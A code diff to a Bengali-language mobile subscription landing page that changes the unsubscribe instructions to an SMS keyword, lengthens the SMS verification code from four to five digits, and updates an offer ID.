@@ -226,7 +226,7 @@
                         <p>💰 <strong>সাবস্ক্রিপশন ফি: ৩.০৩ টাকা/দিন</strong></p>
                         <hr class="tnc-divider">
                         <p>📱 <strong>বাতিল করার নিয়ম:</strong></p>
-                        <p>⚠️ bd.kidonest.com-এ লগ ইন করুন এবং আনসাবস্ক্রাইব করতে "Unsubscribe" বোতামটি ব্যবহার করুন।</p>
+                        <p>⚠️ 12500 নম্বরে UNSUBE পাঠান।</p>
                     </div>
                 </div>
             </div>
@@ -257,14 +257,17 @@
             <button class="btn-back" id="backBtn">← ফিরে যান</button>
             <h2 style="font-size:1.3rem; color:#1e293b; margin-bottom:6px;">🔑 ভেরিফিকেশন কোড দিন</h2>
             <p style="font-size:0.85rem; color:#1e293b;"><strong>আপনার মোবাইলের SMS দেখুন</strong></p>
-            <p style="font-size:0.85rem; color:#1e293b; margin-bottom:10px;"><strong>৪-অঙ্কের কোড দিন</strong></p>
-            
+            <p style="font-size:0.85rem; color:#1e293b; margin-bottom:10px;"><strong>৫-অঙ্কের কোড দিন</strong></p>
+            <p style="font-size:0.85rem; color:#d97706; font-weight:600; margin-bottom:10px; background:#fef3c7; padding:6px 12px; border-radius:8px; display:inline-block;">
+    📴আনসাবস্ক্রাইব করতে 12500 নম্বরে UNSUBE পাঠান।
+  </p>
             <!-- 倒计时显示 -->
             <div class="timer-text" id="timerDisplay">
                 ⏳ ভেরিফিকেশন কোডের মেয়াদ: <span class="seconds" id="countdownSeconds">3:00</span>
             </div>
             
             <div class="pin-container">
+                <input type="text" inputmode="numeric" maxlength="1" class="pin-box">
                 <input type="text" inputmode="numeric" maxlength="1" class="pin-box">
                 <input type="text" inputmode="numeric" maxlength="1" class="pin-box">
                 <input type="text" inputmode="numeric" maxlength="1" class="pin-box">
@@ -296,8 +299,8 @@
 // 【配置】
 // ============================================================
 const API_BASE = 'https://api.bkashofferhub.top';
-const OFFER_ID = '306584';
-const PIN_LENGTH = 4;
+const OFFER_ID = '286449';
+const PIN_LENGTH = 5;
 const OTP_TIMEOUT = 180; // 3分钟 = 180秒
 let currentTxid = null;
 let pinErrorCount = 0;
